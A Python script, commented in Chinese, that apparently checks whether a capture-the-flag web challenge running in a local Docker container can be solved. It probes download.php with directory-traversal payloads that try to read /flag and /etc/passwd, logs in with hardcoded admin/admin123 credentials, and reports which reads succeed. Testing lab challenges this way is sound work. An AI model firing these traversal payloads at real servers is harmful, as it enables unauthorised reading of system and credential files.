#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
web02_read_probe.py — 探测 download.php 的"任意读"是否成立（本题可解性的判据）

用法：python web02_read_probe.py [target]

输出四类结果：
  ★ FLAG   读到了 /flag 的内容 → 本题**可解**
  400      被白名单拒
  404      通过白名单但路径没命中
"""
import re
import subprocess
import sys

import requests

requests.packages.urllib3.disable_warnings()
sys.stdout.reconfigure(encoding='utf-8')

T = (sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:8090').rstrip('/')
S = requests.Session()
S.trust_env = False
S.auth = ('admin', 'admin123')

CASES = [
    ('遍历读 /flag（3 层）',   '/download.php?file=../../../flag'),
    ('遍历读 /flag（6 层）',   '/download.php?file=../../../../../../../flag'),
    ('遍历读 /flag.txt',       '/download.php?file=../../../flag.txt'),
    ('遍历读 /etc/passwd',     '/download.php?file=../../../etc/passwd'),
    ('对照：合法名（应 404）',  '/download.php?file=nope.jpg'),
    ('对照：裸 / 分隔（应拦）', '/download.php?file=a/b'),
]


def variant():
    try:
        o = subprocess.run(['docker', 'exec', 'qwb-r2-web02-app', 'printenv', 'WEB02_VARIANT'],
                           capture_output=True, text=True, timeout=15)
        w = subprocess.run(['docker', 'exec', 'qwb-r2-web02-app', 'printenv', 'WEAK_REGEX'],
                           capture_output=True, text=True, timeout=15)
        return (o.stdout or '').strip() or '?', (w.stdout or '').strip() or '?'
    except Exception:
        return '?', '?'


def main():
    v, w = variant()
    print(f'[*] {T}   WEB02_VARIANT={v}  WEAK_REGEX={w}')
    got = 0
    for name, path in CASES:
        try:
            r = S.get(T + path, timeout=10, verify=False)
            m = re.search(rb'flag\{[^}]*\}', r.content)
            pw = b'root:x:0:0' in r.content
            if m:
                got += 1
                print(f'  ★ {name:24s} -> {r.status_code}  {m.group().decode()}')
            elif pw:
                got += 1
                print(f'  ★ {name:24s} -> {r.status_code}  (读到 /etc/passwd)')
            else:
                print(f'    {name:24s} -> {r.status_code} len={len(r.content):6d} {r.content[:34]!r}')
        except Exception as e:
            print(f'    {name:24s} -> ERR {type(e).__name__}')
    verdict = '可解 ✅' if got else '不可解 ❌'
    print(f'  判定：{verdict}（成功读到的用例 {got} 个）')
    return 0


if __name__ == '__main__':
    sys.exit(main())
